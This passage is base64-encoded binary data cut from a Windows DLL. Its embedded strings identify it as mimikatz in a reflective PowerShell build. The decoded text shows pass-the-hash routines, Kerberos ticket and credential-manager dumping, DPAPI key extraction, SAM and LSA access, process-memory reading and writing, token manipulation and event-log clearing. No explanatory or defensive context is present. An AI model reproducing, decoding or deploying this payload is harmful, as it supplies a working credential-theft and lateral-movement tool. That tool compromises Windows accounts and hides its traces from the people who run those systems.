HIAeQAgAGYAYQBpAGwAZQBkAAoAAAAAAAkAJQBzACAAOgAJAAAAAAAAAAAACgBBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABJAGQAIAA6ACAAJQB1ACAAOwAgACUAdQAgACgAJQAwADgAeAA6ACUAMAA4AHgAKQAKAFMAZQBzAHMAaQBvAG4AIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHMAIABmAHIAbwBtACAAJQB1AAoAVQBzAGUAcgAgAE4AYQBtAGUAIAAgACAAIAAgACAAIAAgACAAOgAgACUAdwBaAAoARABvAG0AYQBpAG4AIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAdwBaAAoAUwBJAEQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAByAHUAbgAAAAAAAAB1AHMAZQByAAkAOgAgACUAcwAKAGQAbwBtAGEAaQBuAAkAOgAgACUAcwAKAHAAcgBvAGcAcgBhAG0ACQA6ACAAJQBzAAoAAABhAGUAcwAxADIAOAAAAAAAQQBFAFMAMQAyADgACQA6ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAxADIAOAAgAGsAZQB5ACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAxADIAOAAgAGsAZQB5ACAAbwBuAGwAeQAgAHMAdQBwAHAAbwByAHQAZQBkACAAZgByAG8AbQAgAFcAaQBuAGQAbwB3AHMAIAA4AC4AMQAgACgAbwByACAANwAvADgAIAB3AGkAdABoACAAawBiADIAOAA3ADEAOQA5ADcAKQAKAAAAYQBlAHMAMgA1ADYAAAAAAEEARQBTADIANQA2AAkAOgAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMgA1ADYAIABrAGUAeQAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADYANAAgACgAMwAyACAAYgB5AHQAZQBzACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMgA1ADYAIABrAGUAeQAgAG8AbgBsAHkAIABzAHUAcABwAG8AcgB0AGUAZAAgAGYAcgBvAG0AIABXAGkAbgBkAG8AdwBzACAAOAAuADEAIAAoAG8AcgAgADcALwA4ACAAdwBpAHQAaAAgAGsAYgAyADgANwAxADkAOQA3ACkACgAAAG4AdABsAG0AAAAAAE4AVABMAE0ACQA6ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABuAHQAbABtACAAaABhAHMAaAAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADMAMgAgACgAMQA2ACAAYgB5AHQAZQBzACkACgAAACAAIAB8ACAAIABQAEkARAAgACAAJQB1AAoAIAAgAHwAIAAgAFQASQBEACAAIAAlAHUACgAAAAAAIAAgAHwAIAAgAEwAVQBJAEQAIAAlAHUAIAA7ACAAJQB1ACAAKAAlADAAOAB4ADoAJQAwADgAeAApAAoAAAAAACAAIABcAF8AIABtAHMAdgAxAF8AMAAgACAAIAAtACAAAAAAACAAIABcAF8AIABrAGUAcgBiAGUAcgBvAHMAIAAtACAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAARwBlAHQAVABvAGsAZQBuAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzAFQAbwBrAGUAbgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAVwBpAHQAaABMAG8AZwBvAG4AVwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAdAAgAGwAZQBhAHMAdAAgAG8AbgBlACAAYQByAGcAdQBtAGUAbgB0ACAAOgAgAG4AdABsAG0AIABPAFIAIABhAGUAcwAxADIAOAAgAE8AUgAgAGEAZQBzADIANQA2AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABNAGkAcwBzAGkAbgBnACAAYQByAGcAdQBtAGUAbgB0ACAAOgAgAGQAbwBtAGEAaQBuAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIAB1AHMAZQByAAoAAAAAAAAAAAAKAAkAIAAqACAAVQBzAGUAcgBuAGEAbQBlACAAOgAgACUAdwBaAAoACQAgACoAIABEAG8AbQBhAGkAbgAgACAAIAA6ACAAJQB3AFoAAAAAAAoACQAgACoAIABMAE0AIAAgACAAIAAgACAAIAA6ACAAAAAAAAoACQAgACoAIABOAFQATABNACAAIAAgACAAIAA6ACAAAAAAAAoACQAgACoAIABTAEgAQQAxACAAIAAgACAAIAA6ACAAAAAAAAoACQAgACoAIABSAGEAdwAgAGQAYQB0AGEAIAA6ACAAAAAAAAoACQAgACoAIABQAEkATgAgAGMAbwBkAGUAIAA6ACAAJQB3AFoAAAAJACAAIAAgACUAcwAgAAAAPABuAG8AIABzAGkAegBlACwAIABiAHUAZgBmAGUAcgAgAGkAcwAgAGkAbgBjAG8AcgByAGUAYwB0AD4AAAAAACUAdwBaAAkAJQB3AFoACQAAAAAAAAAAAAoACQAgACoAIABVAHMAZQByAG4AYQBtAGUAIAA6ACAAJQB3AFoACgAJACAAKgAgAEQAbwBtAGEAaQBuACAAIAAgADoAIAAlAHcAWgAKAAkAIAAqACAAUABhAHMAcwB3AG8AcgBkACAAOgAgAAAAAABMAFUASQBEACAASwBPAAoAAAAAAAoACQAgACoAIABSAG8AbwB0AEsAZQB5ACAAIAA6ACAAAAAAAAoACQAgACoAIABEAFAAQQBQAEkAIAAgACAAIAA6ACAAAAAAAAoACQAgACoAIAAlADAAOAB4ACAAOgAgAAAAAAAKAAkAIABbACUAMAA4AHgAXQAAAGQAcABhAHAAaQBzAHIAdgAuAGQAbABsAAAAAAAJACAAWwAlADAAOAB4AF0ACgAJACAAKgAgAEcAVQBJAEQAIAA6AAkAAAAAAAoACQAgACoAIABUAGkAbQBlACAAOgAJAAAAAAAKAAkAIAAqACAASwBlAHkAIAA6AAkAAAAKAAkASwBPAAAAAABUAGkAYwBrAGUAdAAgAEcAcgBhAG4AdABpAG4AZwAgAFQAaQBjAGsAZQB0AAAAAABDAGwAaQBlAG4AdAAgAFQAaQBjAGsAZQB0ACAAPwAAAFQAaQBjAGsAZQB0ACAARwByAGEAbgB0AGkAbgBnACAAUwBlAHIAdgBpAGMAZQAAAGsAZQByAGIAZQByAG8AcwAuAGQAbABsAAAAAAAKAAkARwByAG8AdQBwACAAJQB1ACAALQAgACUAcwAAAAoACQAgACoAIABLAGUAeQAgAEwAaQBzAHQAIAA6AAoAAAAAAGQAYQB0AGEAIABjAG8AcAB5ACAAQAAgACUAcAAAAAAACgAgACAAIABcAF8AIAAlAHMAIAAAAAAALQA+ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBlAG4AdQBtAF8AawBlAHIAYgBlAHIAbwBzAF8AYwBhAGwAbABiAGEAYwBrAF8AcAB0AGgAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAoAIAAgACAAXABfACAAKgBQAGEAcwBzAHcAbwByAGQAIAByAGUAcABsAGEAYwBlACAALQA+ACAAAAAAAG4AdQBsAGwAAAAAAAoACQAgACAAIAAqACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZQAgACUAcwAgACEAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBrAGUAcgBiAGUAcgBvAHMAXwBlAG4AdQBtAF8AdABpAGMAawBlAHQAcwAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwB3AHIAaQB0AGUARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAFsAJQB4ADsAJQB4AF0ALQAlADEAdQAtACUAdQAtACUAMAA4AHgALQAlAHcAWgBAACUAdwBaAC0AJQB3AFoALgAlAHMAAAAAAFsAJQB4ADsAJQB4AF0ALQAlADEAdQAtACUAdQAtACUAMAA4AHgALgAlAHMAAAAAAGwAaQB2AGUAcwBzAHAALgBkAGwAbAAAAENyZWRlbnRpYWxLZXlzAABQcmltYXJ5AAoACQAgAFsAJQAwADgAeABdACAAJQBaAAAAAABkAGEAdABhACAAYwBvAHAAeQAgAEAAIAAlAHAAIAA6ACAAAABPAEsAIAAhAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAGUAbgB1AG0AXwBjAHIAZQBkAF8AYwBhAGwAbABiAGEAYwBrAF8AcAB0AGgAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAC4AAAAAAAAAbgAuAGUALgAgACgASwBJAFcASQBfAE0AUwBWADEAXwAwAF8AUABSAEkATQBBAFIAWQBfAEMAUgBFAEQARQBOAFQASQBBAEwAUwAgAEsATwApAAAAAAAAAG4ALgBlAC4AIAAoAEsASQBXAEkAXwBNAFMAVgAxAF8AMABfAEMAUgBFAEQARQBOAFQASQBBAEwAUwAgAEsATwApAAAAbQBzAHYAMQBfADAALgBkAGwAbAAAAAAAdABzAHAAawBnAC4AZABsAGwAAAB3AGQAaQBnAGUAcwB0AC4AZABsAGwAAAD+////AAAAALT///8AAAAA/v///wAAAAAABQEQAAAAABADARAkAwEQAAAAAFIDARBmAwEQAAAAAJUDARCpAwEQAAAAANoDARDuAwEQAAAAAAkEARAdBAEQAAAAAD4EARBSBAEQAAAAAIMEARCXBAEQAAAAAMoEARDeBAEQAAAAAP7///8AAAAA2P///wAAAAD+////WjYBEG42ARBgQQIAAAAAAAAAAACESQIAAGABAFBCAgAAAAAAAAAAALhKAgDwYAEA5EMCAAAAAAAAAAAADEsCAIRiAQCkQwIAAAAAAAAAAABQSwIARGIBAGBDAgAAAAAAAAAAAI5MAgAAYgEAtEMCAAAAAAAAAAAAJE0CAFRiAQCcQwIAAAAAAAAAAABGTQIAPGIBAMxDAgAAAAAAAAAAAGhNAgBsYgEA1EMCAAAAAAAAAAAAlk0CAHRiAQCQRAIAAAAAAAAAAAAOTwIAMGMBAIBCAgAAAAAAAAAAAEBSAgAgYQEA/EMCAAAAAAAAAAAA4lICAJxiAQAAAAAAAAAAAAAAAAAAAAAAAAAAAPBEAgAMRQIAHEUCAChFAgA+RQIAWEUCAHBFAgCERQIAmEUCAKhFAgC4RQIAyEUCANZFAgDsRQIA/EUCAA5GAgAeRgIALkYCAEZGAgBYRgIAaEYCAIJGAgCWRgIArEYCAMBGAgDaRgIA7EYCAARHAgAYRwIALkcCAERHAgBYRwIAakcCAHxHAgCMRwIAqkcCALxHAgDORwIA6kcCAAZIAgAkSAIAQEgCAEpIAgBeSAIAckgCAIZIAgCaSAIArEgCAMBIAgDSSAIA4kgCAPZIAgAGSQIAFkkCAChJAgA6SQIATkkCAGZJAgBySQIAAAAAAJJJAgCqSQIAzkkCAORJAgD0SQIAEkoCADZKAgBISgIAbEoCAIpKAgCgSgIAAAAAAABVAgDwVAIA1lQCALhUAgCcVAIAiFQCAGpUAgBUVAIASFQCADJUAgAqUgIAFlICAARSAgDmUQIAyFECALhRAgCcUQIAlFECAIJRAgByUQIAZFECAFRRAgA8UQIAIlECABBRAgD+UAIA7FACANxQAgDGUAIAtFACAKRQAgCOUAIAfFACAGhQAgBUUAIAQlACADJQAgAgUAIADlACAP5PAgDsTwIA3E8CAM5PAgC6TwIArE8CAJRPAgCETwIAFlUCAHBPAgAYTwIAME8CAD5PAgBKTwIAVk8CAGJPAgAAAAAAdksCAIhLAgCYSwIAtEsCAMJLAgDcSwIAdkwCAFhMAgBKTAIAXEsCAPRLAgAETAIAEkwCADRMAgAAAAAAME0CAAAAAAAaSwIALEsCAEBLAgAAAAAA0kwCAARNAgCaTAIAvEwCAO5MAgAAAAAAUk0CAAAAAACATQIAjE0CAHRNAgAAAAAA1koCAOpKAgD2SgIAAksCAMRKAgAAAAAAFFQCAAhUAgD+UwIA9lMCAB5UAgAoVAIA6lMCANxTAgDSUwIAxlMCALpTAgCwUwIAplMCAJ5TAgCSUwIAilMCAKZSAgCyUgIAvFICAMZSAgDQUgIA2FICAO5SAgD4UgIAAlMCABBTAgAaUwIAJlMCADRTAgA+UwIASFMCAFJTAgBiUwIAcFMCAHxTAgCcUgIAAAAAAJJSAgCIUgIAfFICAHBSAgBmUgIAXFICAE5SAgCkTQIAxE0CANhNAgD0TQIADE4CACROAgA0TgIASE4CAGROAgB4TgIAkE4CAKpOAgC8TgIA0k4CAOZOAgD8TgIAAAAAAH0BTHNhUXVlcnlJbmZvcm1hdGlvblBvbGljeQB1AUxzYU9wZW5Qb2xpY3kAVgFMc2FDbG9zZQAAZwBDcmVhdGVXZWxsS25vd25TaWQAAGEAQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcAYABDcmVhdGVQcm9jZXNzQXNVc2VyVwAA+AFSZWdRdWVyeVZhbHVlRXhXAADyAVJlZ1F1ZXJ5SW5mb0tleVcAAOIBUmVnRW51bVZhbHVlVwDtAVJlZ09wZW5LZXlFeFcA3wFSZWdFbnVtS2V5RXhXAMsBUmVnQ2xvc2VLZXkAPgBDbG9zZVNlcnZpY2VIYW5kbGUAAK8ARGVsZXRlU2VydmljZQCuAU9wZW5TQ01hbmFnZXJXAACwAU9wZW5TZXJ2aWNlVwAATAJTdGFydFNlcnZpY2VXAMQBUXVlcnlTZXJ2aWNlU3RhdHVzRXgAAEIAQ29udHJvbFNlcnZpY2UAADsBSXNUZXh0VW5pY29kZQBQAENvbnZlcnRTaWRUb1N0cmluZ1NpZFcAAKwBT3BlblByb2Nlc3NUb2tlbgAAGgFHZXRUb2tlbkluZm9ybWF0aW9uAEoBTG9va3VwQWNjb3VudFNpZFcAWABDb252ZXJ0U3RyaW5nU2lkVG9TaWRXAACUAENyeXB0RXhwb3J0S2V5AACGAENyeXB0QWNxdWlyZUNvbnRleHRXAACaAENyeXB0R2V0S2V5UGFyYW0AAKAAQ3J5cHRSZWxlYXNlQ29udGV4dACTAENyeXB0RW51bVByb3ZpZGVyc1cAmwBDcnlwdEdldFByb3ZQYXJhbQCMAENyeXB0RGVzdHJveUtleQCcAENyeXB0R2V0VXNlcktleQCrAU9wZW5FdmVudExvZ1cABAFHZXROdW1iZXJPZkV2ZW50TG9nUmVjb3JkcwAAOgBDbGVhckV2ZW50TG9nVwAAZQBDcmVhdGVTZXJ2aWNlVwAAQwJTZXRTZXJ2aWNlT2JqZWN0U2VjdXJpdHkAACoAQnVpbGRTZWN1cml0eURlc2NyaXB0b3JXAADCAVF1ZXJ5U2VydmljZU9iamVjdFNlY3VyaXR5AAAdAEFsbG9jYXRlQW5kSW5pdGlhbGl6ZVNpZAAA4gBGcmVlU2lkAJkAQ3J5cHRHZXRIYXNoUGFyYW0AogBDcnlwdFNldEtleVBhcmFtAABwAlN5c3RlbUZ1bmN0aW9uMDMyAFUCU3lzdGVtRnVuY3Rpb24wMDUAnwBDcnlwdEltcG9ydEtleQAAaQJTeXN0ZW1GdW5jdGlvbjAyNQCIAENyeXB0Q3JlYXRlSGFzaACJAENyeXB0RGVjcnlwdAAAiwBDcnlwdERlc3Ryb3lIYXNoAABkAUxzYUZyZWVNZW1vcnkAnQBDcnlwdEhhc2hEYXRhALEBT3BlblRocmVhZFRva2VuAEUCU2V0VGhyZWFkVG9rZW4AALQARHVwbGljYXRlVG9rZW5FeAAAOABDaGVja1Rva2VuTWVtYmVyc2hpcAAAbABDcmVkRnJlZQAAawBDcmVkRW51bWVyYXRlVwAAQURWQVBJMzIuZGxsAAB3AENyeXB0QmluYXJ5VG9TdHJpbmdXAAB0AENyeXB0QWNxdWlyZUNlcnRpZmljYXRlUHJpdmF0ZUtleQBGAENlcnRHZXROYW1lU3RyaW5nVwAAUABDZXJ0T3BlblN0b3JlADwAQ2VydEZyZWVDZXJ0aWZpY2F0ZUNvbnRleHQAAAQAQ2VydEFkZENlcnRpZmljYXRlQ29udGV4dFRvU3RvcmUAAA8AQ2VydENsb3NlU3RvcmUAAEEAQ2VydEdldENlcnRpZmljYXRlQ29udGV4dFByb3BlcnR5ACkAQ2VydEVudW1DZXJ0aWZpY2F0ZXNJblN0b3JlACwAQ2VydEVudW1TeXN0ZW1TdG9yZQAJAVBGWEV4cG9ydENlcnRTdG9yZUV4AABDUllQVDMyLmRsbAAFAENETG9jYXRlQ1N5c3RlbQAGAENETG9jYXRlQ2hlY2tTdW0AAAsATUQ1RmluYWwAAA0ATUQ1VXBkYXRlAAwATUQ1SW5pdABjcnlwdGRsbC5kbGwAAE4AUGF0aElzUmVsYXRpdmVXACIAUGF0aENhbm9uaWNhbGl6ZVcAJABQYXRoQ29tYmluZVcAAFNITFdBUEkuZGxsACYAU2FtUXVlcnlJbmZvcm1hdGlvblVzZXIABgBTYW1DbG9zZUhhbmRsZQAAFABTYW1GcmVlTWVtb3J5ABMAU2FtRW51bWVyYXRlVXNlcnNJbkRvbWFpbgAhAFNhbU9wZW5Vc2VyAB0AU2FtTG9va3VwTmFtZXNJbkRvbWFpbgAAHABTYW1Mb29rdXBJZHNJbkRvbWFpbgAAHwBTYW1PcGVuRG9tYWluAAcAU2FtQ29ubmVjdAAAEQBTYW1FbnVtZXJhdGVEb21haW5zSW5TYW1TZXJ2ZXIAABgAU2FtR2V0R3JvdXBzRm9yVXNlcgAsAFNhbVJpZFRvU2lkABsAU2FtTG9va3VwRG9tYWluSW5TYW1TZXJ2ZXIAABUAU2FtR2V0QWxpYXNNZW1iZXJzaGlwAFNBTUxJQi5kbGwAACgATHNhTG9va3VwQXV0aGVudGljYXRpb25QYWNrYWdlAAAlAExzYUZyZWVSZXR1cm5CdWZmZXIAIwBMc2FEZXJlZ2lzdGVyTG9nb25Qcm9jZXNzACIATHNhQ29ubmVjdFVudHJ1c3RlZAAhAExzYUNhbGxBdXRoZW50aWNhdGlvblBhY2thZ2UAAFNlY3VyMzIuZGxsAAcAQ29tbWFuZExpbmVUb0FyZ3ZXAABTSEVMTDMyLmRsbACYAUlzQ2hhckFscGhhTnVtZXJpY1cAVVNFUjMyLmRsbAAABQBNRDRVcGRhdGUAAwBNRDRGaW5hbAAABABNRDRJbml0AGFkdmFwaTMyLmRsbAAAEABSdGxVbmljb2RlU3RyaW5nVG9BbnNpU3RyaW5nAAAKAFJ0bEZyZWVBbnNpU3RyaW5nAAIATnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uAAAOAFJ0bEluaXRVbmljb2RlU3RyaW5nAAAJAFJ0bEVxdWFsVW5pY29kZVN0cmluZwABAE50UXVlcnlPYmplY3QADABSdGxHZXRDdXJyZW50UGViAAAAAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MADwBSdGxTdHJpbmdGcm9tR1VJRAALAFJ0bEZyZWVVbmljb2RlU3RyaW5nAAANAFJ0bEdldE50VmVyc2lvbk51bWJlcnMAAAMATnRSZXN1bWVQcm9jZXNzAAYAUnRsQWRqdXN0UHJpdmlsZWdlAAAEAE50U3VzcGVuZFByb2Nlc3MAAAUATnRUZXJtaW5hdGVQcm9jZXNzAAAIAFJ0bEVxdWFsU3RyaW5nAABudGRsbC5kbGwAxQBGaWxlVGltZVRvU3lzdGVtVGltZQAAWAJMb2NhbEFsbG9jAABcAkxvY2FsRnJlZQClA1dyaXRlRmlsZQC1AlJlYWRGaWxlAABWAENyZWF0ZUZpbGVXAO4ARmx1c2hGaWxlQnVmZmVycwAAZAFHZXRGaWxlU2l6ZUV4AEEBR2V0Q3VycmVudERpcmVjdG9yeVcAADQAQ2xvc2VIYW5kbGUAQgFHZXRDdXJyZW50UHJvY2VzcwCGAk9wZW5Qcm9jZXNzAHEBR2V0TGFzdEVycm9yAACTAER1cGxpY2F0ZUhhbmRsZQApA1NldExhc3RFcnJvcgAAigBEZXZpY2VJb0NvbnRyb2wAHANTZXRGaWxlUG9pbnRlcgAAiQNWaXJ0dWFsUXVlcnkAAIoDVmlydHVhbFF1ZXJ5RXgAALgCUmVhZFByb2Nlc3NNZW1vcnkAiANWaXJ0dWFsUHJvdGVjdEV4AACHA1ZpcnR1YWxQcm90ZWN0AACuA1dyaXRlUHJvY2Vzc01lbW9yeQAAaAJNYXBWaWV3T2ZGaWxlAHIDVW5tYXBWaWV3T2ZGaWxlAFUAQ3JlYXRlRmlsZU1hcHBpbmdXAABfAkxvY2FsUmVBbGxvYwAAaQBDcmVhdGVQcm9jZXNzVwAASAFHZXREYXRlRm9ybWF0VwAA4QFHZXRUaW1lRm9ybWF0VwAAxABGaWxlVGltZVRvTG9jYWxGaWxlVGltZQBcA1N5c3RlbVRpbWVUb0ZpbGVUaW1lAADIAUdldFN5c3RlbVRpbWUA+ABGcmVlTGlicmFyeQBVAkxvYWRMaWJyYXJ5VwAAoAFHZXRQcm9jQWRkcmVzcwAAVwNTbGVlcADyAlNldENvbnNvbGVDdXJzb3JQb3NpdGlvbgAAuQFHZXRTdGRIYW5kbGUAAMgARmlsbENvbnNvbGVPdXRwdXRDaGFyYWN0ZXJXADcBR2V0Q29uc29sZVNjcmVlbkJ1ZmZlckluZm8AAEMCSXNXb3c2NFByb2Nlc3MAAEUBR2V0Q3VycmVudFRocmVhZAAAQwFHZXRDdXJyZW50UHJvY2Vzc0lkAEtFUk5FTDMyLmRsbAAAHAVfdnNjd3ByaW50ZgBxBXdjc3JjaHIAaAV3Y3NjaHIAAB8FX3djc2ljbXAAACEFX3djc25pY21wAHMFd2Nzc3RyAAB2BXdjc3RvdWwAVgFfZXJybm8AAEIFdmZ3cHJpbnRmAJUEZmZsdXNoAAAnBF93Zm9wZW4AkgRmY2xvc2UAAKYEZnJlZQAA6gNfd2NzZHVwAG1zdmNydC5kbGwAAO4EbWVtc2V0AADqBG1lbWNweQAAagBfWGNwdEZpbHRlcgDeBG1hbGxvYwAA1QFfaW5pdHRlcm0AAQFfYW1zZ19leGl0AACFBGNhbGxvYwAAwARpc2RpZ2l0AOcEbWJ0b3djAACwAF9fbWJfY3VyX21heAAAwgRpc2xlYWRieXRlAADVBGlzeGRpZ2l0AADZBGxvY2FsZWNvbnYAANsBX2lvYgAALwNfc25wcmludGYAMQJfaXRvYQBuBXdjdG9tYgAAlARmZXJyb3IAAMwEaXN3Y3R5cGUAAGkFd2NzdG9tYnMAAP8EcmVhbGxvYwCFAF9fYmFkaW9pbmZvAM8AX19waW9pbmZvAAQDX3JlYWQAbwFfZmlsZW5vAEsCX2xzZWVraTY0AEgEX3dyaXRlAADeAV9pc2F0dHkAPQV1bmdldGMAAI0CT3V0cHV0RGVidWdTdHJpbmdBAADXAlJ0bFVud2luZAApAkludGVybG9ja2VkRXhjaGFuZ2UAJgJJbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZQAAXwNUZXJtaW5hdGVQcm9jZXNzAABvA1VuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAASwNTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAowJRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgDfAUdldFRpY2tDb3VudAAARgFHZXRDdXJyZW50VGhyZWFkSWQAAMoBR2V0U3lzdGVtVGltZUFzR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